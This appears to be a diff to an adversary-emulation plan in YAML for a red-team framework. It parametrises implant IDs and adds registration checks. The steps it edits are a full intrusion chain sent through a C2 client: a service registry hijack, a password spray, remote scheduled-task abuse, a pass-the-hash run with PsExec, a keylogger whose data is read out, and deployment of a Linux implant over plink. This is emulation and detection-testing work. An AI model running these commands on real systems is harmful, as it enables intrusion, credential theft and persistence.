@@ -42,7 +42,27 @@
       description: The network domain name for initial target system.
       type: string
       default: skt
-      
+    first.epic.id: 
+      description: First epic implant ID
+      type: string
+      default: 218780a0-870e-480e-b2c5dc
+    second.epic.id: 
+      description: Second epic implant ID
+      type: string
+      default: 51515228-8a7b-4226-e6e3f4
+    first.carbon.id: 
+      description: First carbon implant ID
+      type: string
+      default: 9b5ef515
+    second.carbon.id: 
+      description: Second carbon implant ID
+      type: string
+      default: a3e63922
+    third.carbon.id: 
+      description: Third carbon implant ID
+      type: string
+      default: c6f2aa03
+
 - id: 2c7ad0e1-d112-4c71-8deb-38bc3ce5654b
   name: Download EPIC dropper (User)
   description: |
@@ -232,7 +252,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'exe | net group "Domain Admins" /domain && net group "Domain Computers" /domain && net group "Domain Controllers" /domain && tasklist /svc' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | net group "Domain Admins" /domain && net group "Domain Computers" /domain && net group "Domain Controllers" /domain && tasklist /svc' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.epic.id
 
 - id: 88bb16c5-f78b-45c3-91b6-a7422cd2fb13
   name: Reg query the ViperVPNSvc Service & verify which users can access it (Adversary)
@@ -248,7 +271,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell "$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access"' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell "$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access"' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.epic.id
 
 - id: d5e29782-72ca-45f0-b286-09525ae91d75
   name: Modify the ViperVPN service registry key (Adversary)
@@ -264,8 +290,11 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'exe | reg add "HKLM\system\currentcontrolset\services\ViperVPNSvc" /t REG_EXPAND_SZ /v ImagePath /d "cmd.exe /c %TEMP%\mxs_installer.exe" /f' --task-wait-timeout 60
-
+          ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg add "HKLM\system\currentcontrolset\services\ViperVPNSvc" /t REG_EXPAND_SZ /v ImagePath /d "cmd.exe /c %TEMP%\mxs_installer.exe" /f' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.epic.id
+      
 - id: 349d3879-c849-493a-989e-6d7f40015f54
   name: RDP to 2nd host (User)
   description: |
@@ -354,7 +383,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 51515228-8a7b-4226-e6e3f4 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{second.epic.id} 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.epic.id
 
 - id: d702d810-3414-4e38-8cbc-22fc429d2da4
   name: Execute the CARBON-DLL installer (Adversary)
@@ -370,9 +402,12 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 51515228-8a7b-4226-e6e3f4 'exe | C:\Windows\System32\WinResSvc.exe' --task-wait-timeout 60; 
+          ./evalsC2client.py --set-and-complete-task #{second.epic.id} 'exe | C:\Windows\System32\WinResSvc.exe' --task-wait-timeout 60; 
           sleep 180;
         timeout: 300
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.epic.id
 
 - id: f2462df4-2867-4d72-b3f1-ffa9a7431f87
   name: Perform whoami discovery command (Adversary)
@@ -388,8 +423,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 9b5ef515 '{"id": 0, "cmd": "whoami"}' --task-wait-timeout 60
-
+          ./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{"id": 0, "cmd": "whoami"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.carbon.id
 
 # Step 5 - Lateral Movement to Domain Controller
 
@@ -434,9 +471,12 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 9b5ef515  '{"id": 1, "payload": "password_spray.bat", "payload_dest": "C:\\Windows\\Temp\\winsas64.bat", "cmd": "C:\\Windows\\Temp\\winsas64.bat"}' --task-wait-timeout 300 | grep 'SUCCESS'
+          ./evalsC2client.py --set-and-complete-task #{first.carbon.id}  '{"id": 1, "payload": "password_spray.bat", "payload_dest": "C:\\Windows\\Temp\\winsas64.bat", "cmd": "C:\\Windows\\Temp\\winsas64.bat"}' --task-wait-timeout 300 | grep 'SUCCESS'
         timeout: 300
-        
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.carbon.id
+
 - id: 4945a1e5-75ab-4665-8441-6995105edf38
   name: Remove password spray script (Adversary)
   description: |
@@ -451,7 +491,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 9b5ef515  '{"id": 2, "cmd": "del /Q C:\\Windows\\Temp\\winsas64.bat"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.carbon.id}  '{"id": 2, "cmd": "del /Q C:\\Windows\\Temp\\winsas64.bat"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.carbon.id
 
 - id: 386b614d-7237-4d1a-a6dd-543f6f515bd4
   name: Download second CARBON-DLL (Adversary)
@@ -467,12 +510,15 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 9b5ef515 '{"id": 3, "payload": "carbon_installer_2.exe", "payload_dest": "C:\\Windows\\Temp\\wmimetricsq.exe", "cmd": "move C:\\Windows\\Temp\\wmimetricsq.exe \\\\#{second.target.host}\\C$\\Windows\\System32"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{"id": 3, "payload": "carbon_installer_2.exe", "payload_dest": "C:\\Windows\\Temp\\wmimetricsq.exe", "cmd": "move C:\\Windows\\Temp\\wmimetricsq.exe \\\\#{second.target.host}\\C$\\Windows\\System32"}' --task-wait-timeout 60
   input_arguments:
     second.target.host: 
       description: The hostname of the second target host.
       type: string
       default: bannik
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.carbon.id
 
 - id: 954ee411-8443-41f9-9a0c-f8ac032b68e7
   name: Enumerate remote scheduled tasks (Adversary)
@@ -488,7 +534,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 9b5ef515 '{"id": 4, "cmd": "schtasks /query /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password}"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{"id": 4, "cmd": "schtasks /query /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password}"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.carbon.id
 
 - id: c90bbb6c-f9bd-4811-b7b7-c923902a8bde
   name: Modify remote scheduled task (Adversary)
@@ -504,7 +553,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 9b5ef515 '{"id": 5, "cmd": "schtasks /Change /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\" /TR %SystemRoot%\\System32\\wmimetricsq.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{"id": 5, "cmd": "schtasks /Change /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\" /TR %SystemRoot%\\System32\\wmimetricsq.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.carbon.id
 
 - id: a2621060-73a5-461b-918d-88a86f83c21b
   name: Execute modified scheduled task (Adversary)
@@ -520,9 +572,12 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task 9b5ef515 '{"id": 6, "cmd": "schtasks /Run /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\" /I"}' --task-wait-timeout 300; 
+          ./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{"id": 6, "cmd": "schtasks /Run /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\" /I"}' --task-wait-timeout 300; 
           sleep 180;
         timeout: 300
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: first.carbon.id
 
 - id: bf90a64c-5367-4de6-93b5-a718189803c3
   name: Discovery on domain controller (Adversary)
@@ -538,8 +593,11 @@
     linux:
       sh:
         command: |
-          output=$(./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 0, "cmd": "net group /domain"}' --task-wait-timeout 60);
+          output=$(./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{"id": 0, "cmd": "net group /domain"}' --task-wait-timeout 60);
           echo $output | grep 'Web Servers' -i && echo $output | grep 'Web Server Admins' -i;
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.carbon.id
 
 - id: 4e39b630-f2d7-405e-a4ef-d11cf79db1be
   name: Enumerate groups (Adversary)
@@ -555,7 +613,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 1, "cmd": "net group \"Web Servers\" /domain && net group \"Web Server Admins\" /domain"}' --task-wait-timeout 60;
+          ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{"id": 1, "cmd": "net group \"Web Servers\" /domain && net group \"Web Server Admins\" /domain"}' --task-wait-timeout 60;
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.carbon.id
 
 - id: 4e31798e-f973-4480-aa38-3372c44c29c9
   name: Enumerate Active Directory Computers (Adversary)
@@ -571,13 +632,15 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 2, "cmd": "dsquery * -filter \"(&(objectclass=computer))\" -attr *"}' --task-wait-timeout 60 | grep -i '#{third.target.user} Workstation'
+          ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{"id": 2, "cmd": "dsquery * -filter \"(&(objectclass=computer))\" -attr *"}' --task-wait-timeout 60 | grep -i '#{third.target.user} Workstation'
   input_arguments:
     third.target.user:
       description: The username of the third target host.
       type: string
       default: adalwolfa
-
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.carbon.id
 
 # Step 6 - Preparation for Lateral Movement onto Second Host
 
@@ -595,8 +658,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 3, "payload": "DvKGMmGn.exe", "payload_dest": "C:\\Windows\\Temp\\terabox.exe", "cmd": "move C:\\Windows\\Temp\\terabox.exe C:\\Windows\\System32\\terabox.exe && C:\\Windows\\System32\\terabox.exe \"lsdu::go /ynot\" \"quit\""}' --task-wait-timeout 60
-
+          ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{"id": 3, "payload": "DvKGMmGn.exe", "payload_dest": "C:\\Windows\\Temp\\terabox.exe", "cmd": "move C:\\Windows\\Temp\\terabox.exe C:\\Windows\\System32\\terabox.exe && C:\\Windows\\System32\\terabox.exe \"lsdu::go /ynot\" \"quit\""}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.carbon.id
 
 # Step 7 - Lateral Movement to Second Workstation
 
@@ -668,7 +733,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 4, "payload": "PsExec.exe", "payload_dest": "C:\\Windows\\Temp\\tmp5712.tmp", "cmd": "move C:\\Windows\\Temp\\tmp5712.tmp C:\\Windows\\System32\\wsqsp.exe && dir C:\\Windows\\System32\\wsqsp.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{"id": 4, "payload": "PsExec.exe", "payload_dest": "C:\\Windows\\Temp\\tmp5712.tmp", "cmd": "move C:\\Windows\\Temp\\tmp5712.tmp C:\\Windows\\System32\\wsqsp.exe && dir C:\\Windows\\System32\\wsqsp.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.carbon.id
 
 - id: 75424a6a-28f5-46fa-834b-508f7d09020a
   name: Download third CARBON-DLL (Adversary)
@@ -684,7 +752,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 5, "payload": "carbon_installer_3.exe", "payload_dest": "C:\\Windows\\Temp\\tmp1283.tmp", "cmd": "move C:\\Windows\\Temp\\tmp1283.tmp C:\\Windows\\System32\\wsqmanager.exe && dir C:\\Windows\\System32\\wsqmanager.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{"id": 5, "payload": "carbon_installer_3.exe", "payload_dest": "C:\\Windows\\Temp\\tmp1283.tmp", "cmd": "move C:\\Windows\\Temp\\tmp1283.tmp C:\\Windows\\System32\\wsqmanager.exe && dir C:\\Windows\\System32\\wsqmanager.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.carbon.id
 
 - id: 824d5eda-7743-4c10-89d8-143d4bc50eda
   name: Copy installer & execute using PsExec (Adversary)
@@ -700,7 +771,7 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 6, "cmd": "C:\\Windows\\System32\\terabox.exe \"pr::d\" \"slsa::htp /user:#{third.target.user} /domain:#{network.domain.name} /ntlm:#{third.target.ntlm} /remotepc:#{third.target.host} /pexe:C:\\Windows\\System32\\wsqsp.exe /sys:1 /prun:C:\\Windows\\System32\\wsqmanager.exe\" \"quit\""}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{"id": 6, "cmd": "C:\\Windows\\System32\\terabox.exe \"pr::d\" \"slsa::htp /user:#{third.target.user} /domain:#{network.domain.name} /ntlm:#{third.target.ntlm} /remotepc:#{third.target.host} /pexe:C:\\Windows\\System32\\wsqsp.exe /sys:1 /prun:C:\\Windows\\System32\\wsqmanager.exe\" \"quit\""}' --task-wait-timeout 60
   input_arguments:
     third.target.ntlm: 
       description: The NTLM hash for the third target user.
@@ -710,7 +781,10 @@
       description: The hostname of the third target host.
       type: string
       default: khabibulin 
-
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.carbon.id
+      
 - id: e7c827d6-57f8-40d0-b3a9-e03b2e4d0484
   name: Clean dropped files (Adversary)
   description: |
@@ -725,8 +799,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 7, "cmd": "del /Q C:\\Windows\\System32\\terabox.exe C:\\Windows\\System32\\wsqsp.exe C:\\Windows\\System32\\wsqmanager.exe"}' --task-wait-timeout 60
-    
+          ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{"id": 7, "cmd": "del /Q C:\\Windows\\System32\\terabox.exe C:\\Windows\\System32\\wsqsp.exe C:\\Windows\\System32\\wsqmanager.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: second.carbon.id
 
 # Step 8 - Credential Access on Admin Host
 
@@ -744,7 +820,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 0, "payload": "keylogger.exe", "payload_dest": "C:\\Windows\\Temp\\wingtsvcupdt.exe", "cmd": "C:\\Windows\\Temp\\wingtsvcupdt.exe -r"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{"id": 0, "payload": "keylogger.exe", "payload_dest": "C:\\Windows\\Temp\\wingtsvcupdt.exe", "cmd": "C:\\Windows\\Temp\\wingtsvcupdt.exe -r"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.carbon.id
 
 - id: 4cedd0ef-c802-431d-a4a1-eaf1163543f3
   name: Adalwolfa types keylogged data (User)
@@ -809,7 +888,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 1, "cmd": "taskkill /IM wingtsvcupdt.exe /F"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{"id": 1, "cmd": "taskkill /IM wingtsvcupdt.exe /F"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.carbon.id
 
 - id: 438939c8-e95a-4fbd-b659-06f0b0b72e47
   name: Exfiltrate keylogged data (Adversary)
@@ -825,8 +907,11 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 2, "cmd": "type %temp%\\~DFA512.tmp"}' --task-wait-timeout 200
+          ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{"id": 2, "cmd": "type %temp%\\~DFA512.tmp"}' --task-wait-timeout 200
         timeout: 200
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.carbon.id
 
 - id: f8ab9b59-89a7-4c25-90bf-0c2485785a36
   name: Remove keylogging evidence (Adversary)
@@ -842,8 +927,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 3, "cmd": "del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp"}' --task-wait-timeout 60
-
+          ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{"id": 3, "cmd": "del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.carbon.id
 
 # Step 9 - Lateral Movement to Linux Server
 
@@ -861,7 +948,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 4, "payload": "hsperfdata.zip", "payload_dest": "C:\\Windows\\Temp\\tmp504e.tmp", "cmd": "dir C:\\Windows\\Temp\\tmp504e.tmp"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{"id": 4, "payload": "hsperfdata.zip", "payload_dest": "C:\\Windows\\Temp\\tmp504e.tmp", "cmd": "dir C:\\Windows\\Temp\\tmp504e.tmp"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.carbon.id
 
 - id: d760974d-6466-40b9-8532-b6be578428fc
   name: Download pscp.exe (Adversary)
@@ -877,7 +967,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 5, "payload": "pscp.exe", "payload_dest": "C:\\Windows\\Temp\\pscp.exe", "cmd": "move C:\\Windows\\Temp\\pscp.exe C:\\Windows\\System32\\pscp.exe && dir C:\\Windows\\System32\\pscp.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{"id": 5, "payload": "pscp.exe", "payload_dest": "C:\\Windows\\Temp\\pscp.exe", "cmd": "move C:\\Windows\\Temp\\pscp.exe C:\\Windows\\System32\\pscp.exe && dir C:\\Windows\\System32\\pscp.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.carbon.id
 
 - id: 83a79c7d-721c-44ac-b8d5-d9ba2bc84852
   name: Copy Penquin to Apache web server (Adversary)
@@ -893,7 +986,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 6, "cmd": "echo y | C:\\Windows\\System32\\pscp.exe -pw #{third.target.password} C:\\Windows\\Temp\\tmp504e.tmp #{third.target.user}@#{apache.server.ip}:/tmp/tmp514f524f"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{"id": 6, "cmd": "echo y | C:\\Windows\\System32\\pscp.exe -pw #{third.target.password} C:\\Windows\\Temp\\tmp504e.tmp #{third.target.user}@#{apache.server.ip}:/tmp/tmp514f524f"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.carbon.id
 
 - id: 4468cc14-8e77-44cd-93de-b892253b3e27
   name: Download plink.exe (Adversary)
@@ -909,7 +1005,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 7, "payload": "plink.exe", "payload_dest": "C:\\Windows\\Temp\\plink.exe", "cmd": "move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.exe && dir C:\\Windows\\System32\\plink.exe"}' --task-wait-timeout 60
+          ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{"id": 7, "payload": "plink.exe", "payload_dest": "C:\\Windows\\Temp\\plink.exe", "cmd": "move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.exe && dir C:\\Windows\\System32\\plink.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.carbon.id
 
 - id: 8c6a546b-e03b-4761-b422-8eaf40f59580
   name: Execute Penquin (Adversary)
@@ -925,8 +1024,11 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 8, "cmd": "(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Windows\\System32\\plink.exe -ssh -l #{third.target.user} -pw #{third.target.password} #{apache.server.ip}"}' --task-wait-timeout 200; sleep 60;
+          ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{"id": 8, "cmd": "(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Windows\\System32\\plink.exe -ssh -l #{third.target.user} -pw #{third.target.password} #{apache.server.ip}"}' --task-wait-timeout 200; sleep 60;
         timeout: 200
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.carbon.id
 
 - id: 1fe4de9d-d8d3-4188-8a2a-6ff42394400c
   name: Clean up downloaded files (Adversary)
@@ -942,8 +1044,10 @@
     linux:
       sh:
         command: |
-          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 9, "cmd": "del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe"}' --task-wait-timeout 60
-
+          ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{"id": 9, "cmd": "del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe"}' --task-wait-timeout 60
+  requirements:
+    - plugins.emu.app.requirements.check_registered:
+      - source: third.carbon.id
 
 # Step 10 - Installation of Watering Hole
 
